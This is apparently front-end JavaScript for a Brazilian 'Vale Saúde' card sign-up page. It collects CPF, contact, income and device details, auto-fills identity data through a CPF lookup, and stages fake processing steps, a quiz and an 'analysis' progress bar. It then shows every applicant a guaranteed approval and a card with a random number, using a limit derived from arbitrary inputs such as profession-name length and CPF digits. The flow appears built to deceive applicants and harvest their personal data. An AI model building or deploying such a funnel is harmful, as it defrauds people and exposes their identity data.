(() => {
  const form = document.getElementById('cadastroForm');
  const modalProc = document.getElementById('modalProcessando');
  const modalAprov = document.getElementById('modalAprovacao');
  const btnContinuar = document.getElementById('btnContinuar');

  function abreviarNome(nome) {
    const partes = (nome || '').trim().split(/\s+/);
    if (partes.length <= 1) return (partes[0] || 'TITULAR').toUpperCase();
    return (partes[0] + ' ' + partes[partes.length - 1][0] + '.').toUpperCase();
  }

  function gerarCardSVG(nome, limite, ultimos4) {
    const nomeDisplay = abreviarNome(nome);
    const ultimos = String(ultimos4).padStart(4, '0').slice(0, 4);
    const numDisplay = '****  ****  ****  ' + ultimos;
    const limiteDisplay = limite.toFixed(2).replace('.', ',');
    return `<svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:340px;height:auto;display:block;margin:0 auto;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.35);">
  <defs>
    <linearGradient id="cardBg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0f172a"/>
      <stop offset="50%" stop-color="#1a365d"/>
      <stop offset="100%" stop-color="#0d9488"/>
    </linearGradient>
    <linearGradient id="chipGrad" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#fbbf24"/>
      <stop offset="100%" stop-color="#d97706"/>
    </linearGradient>
  </defs>
  <rect width="340" height="210" rx="16" fill="url(#cardBg)"/>
  <rect x="30" y="38" width="48" height="38" rx="6" fill="url(#chipGrad)" opacity="0.9"/>
  <rect x="34" y="42" width="40" height="30" rx="4" fill="none" stroke="#b45309" stroke-width="0.8" opacity="0.5"/>
  <text x="320" y="48" font-family="Arial,sans-serif" font-size="10" font-weight="700" fill="rgba(255,255,255,0.5)" text-anchor="end">VALE SAÚDE</text>
  <circle cx="284" cy="82" r="14" fill="#eb001b" opacity="0.7"/>
  <circle cx="297" cy="82" r="14" fill="#f79e1b" opacity="0.7"/>
  <text x="30" y="125" font-family="'Courier New',monospace" font-size="20" font-weight="700" fill="white" letter-spacing="3">${numDisplay}</text>
  <text x="30" y="160" font-family="Arial,sans-serif" font-size="11" fill="rgba(255,255,255,0.5)">TITULAR</text>
  <text x="30" y="178" font-family="Arial,sans-serif" font-size="15" font-weight="600" fill="white">${nomeDisplay}</text>
  <text x="310" y="160" font-family="Arial,sans-serif" font-size="11" fill="rgba(255,255,255,0.5)" text-anchor="end">VALIDADE</text>
  <text x="310" y="178" font-family="Arial,sans-serif" font-size="15" font-weight="600" fill="white" text-anchor="end">12/28</text>
  <rect x="30" y="185" width="280" height="1" fill="rgba(255,255,255,0.15)"/>
  <text x="30" y="200" font-family="Arial,sans-serif" font-size="12" fill="rgba(255,255,255,0.7)">Limite: <tspan font-weight="700" fill="white">R$ ${limiteDisplay}</tspan></text>
</svg>`;
  }

  function show(el) { if (el) el.hidden = false; }
  function hide(el) { if (el) el.hidden = true; }

  function calcularLimite(renda, profissao, situacao, cpf) {
    const rendaNum = parseFloat(renda) || 0;
    let base = 450;

    // Renda
    if (rendaNum <= 1212) base += 0;
    else if (rendaNum <= 2500) base += 100;
    else if (rendaNum <= 4000) base += 200;
    else if (rendaNum <= 6000) base += 350;
    else if (rendaNum <= 10000) base += 500;
    else base += 750;

    // Situação trabalhista
    const sitMap = { CLT: 100, PJ: 200, 'Autônomo': 50, Aposentado: 150, Desempregado: 0 };
    base += sitMap[situacao] || 50;

    // Profissão (pequeno bonus)
    const profScore = profissao ? profissao.length % 3 * 30 : 0;
    base += profScore;

    // Determinístico por CPF (últimos 2 dígitos mapeados para 0-40)
    const cpfDigits = cpf.replace(/\D/g, '');
    const cpfVariance = parseInt(cpfDigits.slice(-2)) % 40;
    base += cpfVariance;

    // Arredonda para o múltiplo de 50 mais próximo
    const rounded = Math.round(base / 50) * 50;
    return Math.min(rounded, 1500);
  }

  // CPF mask + auto-fetch + existing check
  let cpfFetched = false;
  let cpfBackendChecked = false;
  const cpfInput = document.getElementById('cpf');
  cpfInput.addEventListener('input', e => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length > 3) v = v.slice(0,3) + '.' + v.slice(3);
    if (v.length > 7) v = v.slice(0,7) + '.' + v.slice(7);
    if (v.length > 11) v = v.slice(0,11) + '-' + v.slice(11);
    e.target.value = v.slice(0,14);
    if (v.replace(/\D/g, '').length === 11 && !cpfFetched) {
      cpfFetched = true;
      consultarCPF(v.replace(/\D/g, ''));
    }
    if (v.replace(/\D/g, '').length === 11 && !cpfBackendChecked) {
      cpfBackendChecked = true;
      verificarCPFExistente(v.replace(/\D/g, ''));
    }
  });

  async function verificarCPFExistente(cpf) {
    try {
      const client = await API.getClientByCpf(cpf);
      if (!client || !client.id) return;

      // Only aprovado/ativado → parabens; pendente → normal flow
      if (client.status !== 'aprovado' && client.status !== 'ativado') return;

      // Found existing approved client — show returning modal and redirect to parabens
      const modalReturn = document.getElementById('modalReturning');
      const steps = document.querySelectorAll('#returningSteps .step');

      show(modalReturn);

      function sDelay(ms) { return new Promise(r => setTimeout(r, ms)); }

      await sDelay(600);
      steps[1].classList.remove('active');
      steps[1].classList.add('done');
      steps[2].classList.add('active');

      await sDelay(600);
      steps[2].classList.remove('active');
      steps[2].classList.add('done');

      await sDelay(1200);

      const nomeCompleto = client.nome || '';
      const primeiroNome = nomeCompleto.split(' ')[0] || '';
      const limite = client.limite_aprovado || 500;

      sessionStorage.setItem('vs_clientId', client.id);
      sessionStorage.setItem('vs_nome', primeiroNome);
      sessionStorage.setItem('vs_nome_completo', nomeCompleto);
      sessionStorage.setItem('vs_limite', limite);

      window.location.href = 'parabens.html?' + new URLSearchParams({
        clientId: client.id,
        nome: primeiroNome
      });
    } catch (e) {
      // CPF not found — allow normal flow
    }
  }

  async function consultarCPF(cpf) {
    const nomeInput = document.getElementById('nome');
    if (nomeInput.value.trim()) return;
    try {
      const resp = await fetch((window.__API_BASE || '/api') + '/cpf/consult', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf })
      });
      if (!resp.ok) return;
      const json = await resp.json();
      const d = json.data || json;
      if (d.nome_completo) nomeInput.value = d.nome_completo;
      else if (d.nome) nomeInput.value = d.nome;
      if (d.data_nascimento) {
        const nasc = d.data_nascimento.replace(/^(\d{2})\/(\d{2})\/(\d{4})$/, '$3-$2-$1');
        document.getElementById('nascimento').value = nasc;
      }
      if (d.sexo) document.getElementById('sexo').value = d.sexo;
    } catch {}
  }

  // WhatsApp mask
  document.getElementById('whatsapp').addEventListener('input', e => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length > 2) v = '(' + v.slice(0,2) + ') ' + v.slice(2);
    if (v.length > 10) v = v.slice(0,10) + '-' + v.slice(10);
    e.target.value = v.slice(0,15);
  });

  // Renda mask
  document.getElementById('renda').addEventListener('input', e => {
    let v = e.target.value.replace(/\D/g, '');
    e.target.value = v;
  });

  // CEP mask + auto-fill
  let cepFetched = false;
  const cepInput = document.getElementById('cep');
  cepInput.addEventListener('input', e => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length > 5) v = v.slice(0,5) + '-' + v.slice(5);
    e.target.value = v.slice(0,9);
    if (v.replace(/\D/g, '').length === 8 && !cepFetched) {
      cepFetched = true;
      buscarCEP(v.replace(/\D/g, ''));
    }
  });

  async function buscarCEP(cep) {
    if (cep.length !== 8) return;
    try {
      const resp = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await resp.json();
      if (data.erro) return;
      document.getElementById('rua').value = data.logradouro || '';
      document.getElementById('bairro').value = data.bairro || '';
      document.getElementById('cidade').value = data.localidade || '';
      document.getElementById('uf').value = data.uf || '';
    } catch {}
  }

  document.getElementById('btnBuscarCep').addEventListener('click', () => {
    const cep = cepInput.value.replace(/\D/g, '');
    if (cep.length !== 8) return alert('Digite um CEP válido');
    cepFetched = true;
    buscarCEP(cep);
  });

  // Submit
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (!form.checkValidity()) return form.reportValidity();

    const btn = form.querySelector('button[type="submit"]');
    btn.disabled = true;
    btn.textContent = 'Enviando...';

    const data = Object.fromEntries(new FormData(form).entries());

    // Calcula o limite ANTES de enviar para a API
    const limite = calcularLimite(data.renda, data.profissao, data.situacao, data.cpf);
    data.limite_aprovado = limite;

    // Captura dispositivo
    data.dispositivo = navigator.platform || navigator.userAgentData?.platform || '';
    data.modelo = (navigator.userAgent || '').slice(0, 120);

    try {
    // Show animated processing modal with steps
    show(modalProc);

    const steps = document.querySelectorAll('#stepsContainer .step');

    function stepDelay(ms) {
      return new Promise(r => setTimeout(r, ms));
    }

    // Fire API call in parallel (graceful fallback if backend offline)
    const apiPromise = API.createClient(data).catch(() => null);

    // Animate steps: each advances every 1s
    await stepDelay(1000);
    // step 1 → done
    steps[1].classList.remove('active');
    steps[1].classList.add('done');
    // step 2 → active
    steps[2].classList.add('active');

    await stepDelay(1000);
    // step 2 → done
    steps[2].classList.remove('active');
    steps[2].classList.add('done');
    // step 3 → active
    steps[3].classList.add('active');

    await stepDelay(1000);
    // step 3 → done
    steps[3].classList.remove('active');
    steps[3].classList.add('done');

    // Wait for API to complete (or null if failed)
    const result = await apiPromise;

    await stepDelay(400);

    hide(modalProc);

    const nomeCompleto = data.nome || '';
    const primeiroNome = nomeCompleto.split(' ')[0];

    const clientId = result ? result.clientId : 'CLI-' + Date.now().toString(36).toUpperCase();

    sessionStorage.setItem('vs_clientId', clientId);
    sessionStorage.setItem('vs_nome', primeiroNome);
    sessionStorage.setItem('vs_nome_completo', nomeCompleto);
    sessionStorage.setItem('vs_limite', limite);

    // --- Questionário interativo ---
    const modalQuiz = document.getElementById('modalQuestionario');
    const modalAnalise = document.getElementById('modalAnaliseFinal');
    const quizBody = document.getElementById('quizBody');
    const quizCounter = document.getElementById('quizCounter');
    const quizProgressBar = document.getElementById('quizProgressBar');
    const analiseProgressBar = document.getElementById('analiseProgressBar');
    const analiseProgressText = document.getElementById('analiseProgressText');

    const perguntas = [
      { titulo: 'Quanto você costuma gastar com medicamentos por mês?', opcoes: ['Até R$ 50', 'Entre R$ 51 e R$ 200', 'Acima de R$ 200'] },
      { titulo: 'Com que frequência você compra medicamentos ou produtos de farmácia?', opcoes: ['Apenas quando necessário', 'Pelo menos 1 vez por mês', 'Várias vezes por mês'] },
      { titulo: 'Qual é o principal motivo para solicitar seu Cartão Vale Saúde?', opcoes: ['Economizar nas compras da farmácia', 'Ter mais praticidade e benefícios', 'Aproveitar descontos exclusivos'] },
      { titulo: 'Quem costuma utilizar medicamentos na sua família?', opcoes: ['Apenas eu', 'Eu e mais uma pessoa', 'Toda a família'] }
    ];

    let perguntaAtual = 0;

    function renderQuizPergunta() {
      const p = perguntas[perguntaAtual];
      quizCounter.textContent = 'Pergunta ' + (perguntaAtual + 1) + ' de ' + perguntas.length;
      quizProgressBar.style.width = ((perguntaAtual / perguntas.length) * 100) + '%';

      let html = '<div class="quiz-pergunta">' + p.titulo + '</div><div class="quiz-opcoes">';
      p.opcoes.forEach(function(opcao, i) {
        html += '<div class="quiz-opcao">'
          + '<input type="radio" name="quiz" id="quizOpt' + i + '" value="' + opcao + '">'
          + '<label for="quizOpt' + i + '">' + opcao + '</label>'
          + '</div>';
      });
      html += '</div>';
      quizBody.innerHTML = html;

      document.querySelectorAll('#modalQuestionario .quiz-opcao input').forEach(function(input) {
        input.addEventListener('change', function() {
          perguntaAtual++;
          if (perguntaAtual < perguntas.length) {
            renderQuizPergunta();
          } else {
            quizProgressBar.style.width = '100%';
            setTimeout(function() {
              hide(modalQuiz);
              iniciarAnaliseFinal();
            }, 400);
          }
        });
      });
    }

    function iniciarAnaliseFinal() {
      show(modalAnalise);
      analiseProgressBar.style.width = '0%';
      analiseProgressText.textContent = '0%';
      var passo = 0;
      var totalPassos = 160; // 8s a 50ms cada
      var timer = setInterval(function() {
        passo++;
        var pct = Math.min(Math.round((passo / totalPassos) * 100), 100);
        analiseProgressBar.style.width = pct + '%';
        analiseProgressText.textContent = pct + '%';
        if (pct >= 100) {
          clearInterval(timer);
          setTimeout(function() {
            hide(modalAnalise);
            var u4 = String(Math.floor(Math.random() * 9000 + 1000));
            var c = document.getElementById('cardContainer');
            if (c) c.innerHTML = gerarCardSVG(nomeCompleto, limite, u4);
            var elValor = document.getElementById('aprovValor');
            if (elValor) elValor.textContent = 'R$ ' + limite.toFixed(2).replace('.', ',');
            var elNome = document.getElementById('aprovNomeDestaque');
            if (elNome) elNome.textContent = (primeiroNome || '').toUpperCase();
            show(modalAprov);
          }, 500);
        }
      }, 50);
    }

    show(modalQuiz);
    renderQuizPergunta();
    } catch (err) {
      hide(modalProc);
      alert('Erro: ' + (err.message || 'Tente novamente'));
      btn.disabled = false;
      btn.textContent = 'Solicitar Vale Saúde';
    }
  });

  btnContinuar.addEventListener('click', () => {
    hide(modalAprov);
    show(document.getElementById('modalSelecionando'));
    const params = new URLSearchParams({
      clientId: sessionStorage.getItem('vs_clientId'),
      nome: sessionStorage.getItem('vs_nome'),
      limite: sessionStorage.getItem('vs_limite')
    });
    setTimeout(() => { window.location.href = 'escolha.html?' + params; }, 2500);
  });

  document.querySelectorAll('.modal__overlay').forEach(ov => {
    ov.addEventListener('click', () => {
      hide(modalProc);
      hide(modalAprov);
      hide(document.getElementById('modalReturning'));
    });
  });
})();